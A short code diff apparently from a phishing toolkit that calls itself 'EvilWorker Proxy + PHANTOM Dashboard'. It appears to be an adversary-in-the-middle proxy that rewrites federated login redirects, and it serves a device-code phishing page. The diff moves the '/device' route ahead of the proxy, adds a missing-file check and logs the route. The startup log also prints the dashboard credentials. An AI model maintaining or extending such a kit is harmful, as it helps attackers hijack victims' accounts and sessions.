@@ -1403,11 +1403,6 @@ dashApp.post('/api/device/use', async (req, res) => {
     });
 });
 
-// ── ADD ROUTE FOR DEVICE CODE PAGE ──
-dashApp.get('/device', (req, res) => {
-    res.sendFile(path.join(__dirname, 'public', 'device_code.html'));
-});
-
 // ================================================
 // 𝙿𝚁𝙾𝚇𝚈 𝚂𝙴𝚁𝚅𝙴𝚁
 // ================================================
@@ -2367,10 +2362,20 @@ function updateFederationRedirectUrl(decompressedResponseBody, proxyHostname) {
 }
 
 // ================================================
-// 𝚂𝚃𝙰𝚁𝚃 𝙱𝙾𝚃𝙷 𝙾𝙽 𝚃𝙷𝙴 𝚂𝙰𝙼𝙴 𝙿𝙾𝚁𝚃
+// 𝚂𝚃𝙰𝚁𝚃 𝙱𝙾𝚃𝙷 𝙾𝙽 𝚃𝙷𝙴 𝚂𝙰𝙼𝙴 𝙿𝙾𝚁𝚃 (FIXED: /device route added)
 // ================================================
 
 const app = express();
+
+// ── ✅ DEVICE CODE ROUTE (BEFORE PROXY) ──
+app.get('/device', (req, res) => {
+    const filePath = path.join(__dirname, 'public', 'device_code.html');
+    if (fs.existsSync(filePath)) {
+        res.sendFile(filePath);
+    } else {
+        res.status(404).send('Device page not found. Please create public/device_code.html');
+    }
+});
 
 app.use('/dash', dashApp);
 
@@ -2385,6 +2390,7 @@ const PORT = process.env.PORT || 3000;
 const server = app.listen(PORT, () => {
     console.log(`✅ EvilWorker Proxy + PHANTOM Dashboard running on port ${PORT}`);
     console.log(`🔐 Dashboard: /dash (auth: ${dashUser}/${dashPass})`);
+    console.log(`📱 Device Code: /device`);
 });
 
 const wss = new WebSocket.Server({ server });
